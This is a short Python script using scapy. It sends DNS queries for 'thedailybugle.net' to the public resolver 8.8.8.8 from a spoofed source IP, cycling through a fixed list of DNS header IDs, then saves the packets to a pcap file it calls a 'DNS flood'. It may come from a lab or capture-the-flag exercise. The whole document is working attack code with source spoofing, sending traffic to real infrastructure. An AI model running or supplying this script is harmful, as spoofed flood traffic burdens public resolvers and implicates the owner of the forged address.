from scapy.all import *

# Data list
header_ids = [182, 23, 154, 182, 214, 156, 146, 43, 29, 159, 145, 117, 163, 64]

# Target info
src_ip = "9.92.92.92"     # Spoofed source IP
dst_ip = "8.8.8.8"
dns_name = "thedailybugle.net"

# Store packets for saving to pcap
packets = []
i = 0

while i <= 25:
    for tid in header_ids:
        ip = IP(src=src_ip, dst=dst_ip)
        udp = UDP(sport=RandShort(), dport=53)
        dns = DNS(id=tid, rd=1, qd=DNSQR(qname=dns_name))
        packet = ip / udp / dns
        packets.append(packet)

        send(packet, verbose=0)
        print(f"[+] Sent DNS query with Header ID: {tid}")
    i += 1  # <-- FIXED HERE

# Save to pcap
wrpcap("DNS_flood.pcap", packets)
print("[+] Successfully DNS flood is done and saved as DNS_flood.pcap")
